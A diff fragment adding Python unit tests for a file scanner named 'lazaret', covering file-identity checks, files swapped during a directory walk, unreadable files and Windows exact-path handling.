+        for python in WINDOWS_PYTHONS:
+            with self.subTest(python=python), _listing_without_ids(python):
+                fd = os.open(at, os.O_RDONLY)
+                try:
+                    fst = os.fstat(fd)
+                finally:
+                    os.close(fd)
+                lst, st = os.lstat(at), os.stat(at)
+                # (the stand-in's premise, CPython's: lstat's change time is fstat's from 3.12 no more)
+                self.assertEqual(lst.st_ctime_ns != fst.st_ctime_ns, python >= (3, 12))
+                self.assertEqual({lazaret._held_time(s) for s in (lst, st, fst)}, {lst.st_mtime_ns - MADE_BEFORE_NS})
+                self.assertTrue(lazaret._same_file(fst, lazaret._file_record(lst)))
+        if os.name != "nt":                             # (this system's: POSIX's change time, as before)
+            st = os.lstat(at)
+            self.assertEqual(lazaret._held_time(st), st.st_ctime_ns)
+
+    def test_a_file_written_after_it_was_made_is_the_walks(self):
+        # (the review's HIGH: an edited file, one checked out or one extracted with its times, unchanged during the
+        # call, was "another file" at its read on 3.12 and later: the call incomplete, the gate FAILED)
+        for python in self.PYTHONS:
+            for name, tool in TOOLS + (("scan_project", None),):
+                with self.subTest(python=python, tool=name):
+                    inside, _outside = self.tree()
+                    self.write(inside, "a.py", "x = 2\n")                         # (written again)
+                    os.utime(os.path.join(inside, "sub", "c.py"), ns=(0, 1_600_000_000_000_000_000))    # (set back)
+                    with _listing_without_ids(python), self.watching():
+                        out = tool({"path": inside}) if tool else lazaret.scan_project(inside)
+                    self.assertFalse(out.get("incomplete"), out)
+                    if tool:
+                        self.assertEqual(out["qualityGate"], "PASSED", out)
+                    if name != "quality_gate":
+                        self.assertFalse([i for i in out["issues"] if i["rule"] in ("SC-TRUNCATED", "Q-UNREADABLE")],
+                                         out["issues"])
+                    self.assertIn(INSIDE.encode(), self.reads)                   # (sub/c.py, read)
+
+    def test_another_file_with_the_same_text_size_and_times_is_a_change(self):
+        # (the swap the Windows runs made by chance, made every time: lib/run.dat after the walk, before the hook's
+        # reader reads it; package.json once the walk has listed the root, before it reads it)
+        for python in self.PYTHONS:
+            for name, tool in TOOLS:
+                for rel, when in (("lib/run.dat", "walked"), ("package.json", "listed")):
+                    with self.subTest(python=python, tool=name, file=rel):
+                        inside, outside = self.tree()
+                        self.put(inside, {"package.json": GATE_PKG if when == "listed" else HOOK_PKG,
+                                          "lib/run.dat": RISKY_JS})
+                        with _listing_without_ids(python):
+                            out = tool({"path": inside})
+                        self.assertFalse(out.get("incomplete"), out)       # (unswapped: complete, as before)
+                        with _listing_without_ids(python), \
+                                self.watching(lambda: self.change(inside, outside, rel, "other file"), when=when,
+                                              after=()):
+                            out = tool({"path": inside})
+                        self.assertNotRead(name, out, os.path.join(*rel.split("/")))
+
+    def test_a_file_that_cannot_be_opened_is_unreadable_only_while_it_is_the_walks(self):
+        real = lazaret._Root._open
+        for python in self.PYTHONS:
+            for changed in (False, True):
+                with self.subTest(python=python, changed=changed):
+                    inside, outside = self.tree()
+
+                    def deny(tree, parts):
+                        if parts[-1] == "a.py":
+                            if changed:
+                                self.change(inside, outside, "a.py", "other file")
+                            raise PermissionError(13, "Permission denied")
+                        return real(tree, parts)
+                    with _listing_without_ids(python), mock.patch.object(lazaret._Root, "_open", deny):
+                        out = server.tool_scan_directory({"path": inside})
+                    if changed:                     # (Windows' runs: a Q-UNREADABLE note, and the gate passed)
+                        self.assertNotRead("scan_directory", out, "a.py")
+                    else:
+                        self.assertEqual(self.rules(out, "a.py"), {("Q-UNREADABLE", "INFO")})
+                        self.assertFalse(out.get("incomplete"))
+
+    def test_an_entry_whose_id_cannot_be_had_is_not_taken_for_the_file_opened(self):
+        # (its lstat failed, or the disk keeps none: the walk's entry has no ID, the file opened has one)
+        real = lazaret._Root._identified
+
+        def identified(where, name, st):
+            return st if name == "a.py" else real(where, name, st)
+        for python in self.PYTHONS:
+            with self.subTest(python=python):
+                inside, _outside = self.tree()
+                with _listing_without_ids(python), \
+                        mock.patch.object(lazaret._Root, "_identified", staticmethod(identified)):
+                    out = server.tool_scan_directory({"path": inside})
+                self.assertNotRead("scan_directory", out, "a.py")
+                self.assertEqual([i["file"] for i in out["issues"] if i["rule"] == "SC-TRUNCATED"], ["a.py"])
+
+    def test_windows_exact_path_takes_every_folder_form(self):
+        # (on every system: Windows' paths, made as Windows makes them, ntpath's; the review's L1: a \\.\ folder was
+        # kept as it was, and Windows rewrites the names under one)
+        for folder, want in (("C:\\x", "\\\\?\\C:\\x\\a.js."),
+                             ("C:\\", "\\\\?\\C:\\a.js."),
+                             ("C:/x/", "\\\\?\\C:\\x\\a.js."),
+                             ("\\\\srv\\share\\x", "\\\\?\\UNC\\srv\\share\\x\\a.js."),
+                             ("\\\\?\\C:\\x", "\\\\?\\C:\\x\\a.js."),
+                             ("\\\\?\\UNC\\srv\\share\\x", "\\\\?\\UNC\\srv\\share\\x\\a.js."),
+                             ("\\\\.\\C:\\x", "\\\\?\\C:\\x\\a.js."),
+                             ("\\\\.\\C:", "\\\\?\\C:\\a.js."),
+                             ("//./C:/x", "\\\\?\\C:\\x\\a.js."),
+                             ("\\\\.\\UNC\\srv\\share\\x", "\\\\?\\UNC\\srv\\share\\x\\a.js."),
+                             # (NT's \??\, which Win32 opens too: the round 3c review's LOW-3)
+                             ("\\??\\C:\\x", "\\\\?\\C:\\x\\a.js."),
+                             ("\\??\\UNC\\srv\\share\\x", "\\\\?\\UNC\\srv\\share\\x\\a.js.")):
+            with self.subTest(folder=folder):
+                self.assertEqual(lazaret._windows_exact_path(folder, "a.js."), want)
+
+    def test_the_exact_path_keeps_every_name_as_listed(self):
+        # (Win32 drops a name's trailing dots and spaces: a.js. would name a.js; \\?\ takes it as it is, past MAX_PATH)
+        if os.name != "nt":
+            self.assertEqual(lazaret._exact_path(self.base, "a.js."), os.path.join(self.base, "a.js."))
+            return
+        drive = os.path.splitdrive(os.path.abspath(self.base))[0]
+        for folder, want in ((drive + "\\x", "\\\\?\\" + drive + "\\x\\a.js."),
+                             (drive + "\\", "\\\\?\\" + drive + "\\a.js."),
+                             ("\\\\srv\\share\\x", "\\\\?\\UNC\\srv\\share\\x\\a.js."),
+                             ("\\\\?\\" + drive + "\\x", "\\\\?\\" + drive + "\\x\\a.js."),
+                             ("\\\\.\\" + drive + "\\x", "\\\\?\\" + drive + "\\x\\a.js.")):
+            with self.subTest(folder=folder):
+                self.assertEqual(lazaret._exact_path(folder, "a.js."), want)
+        inside, _outside = self.tree()
+        with open(lazaret._exact_path(inside, "a.js."), "wb") as fh:        # (a name Win32 cannot make)
+            fh.write(RISKY_JS.encode())
+        self.addCleanup(os.unlink, lazaret._exact_path(inside, "a.js."))    # (nor remove: shutil.rmtree's)
+        st = os.lstat(lazaret._exact_path(inside, "a.js."))
+        self.assertTrue(stat.S_ISREG(st.st_mode) and st.st_ino)
+        dev = "\\\\.\\" + lazaret._exact_path(inside, "a.js.")[4:]           # (the device form names it too)
+        self.assertEqual(lazaret._exact_path(os.path.dirname(dev), "a.js."), lazaret._exact_path(inside, "a.js."))
+        out = server.tool_scan_directory({"path": inside})
+        # (it is listed and has its own ID; opened by its path it is a.js, which is not there: not read, a change)
+        self.assertNotRead("scan_directory", out, "a.js.")
 
 
 @unittest.skipUnless(_can_link(), "symbolic links cannot be made here")
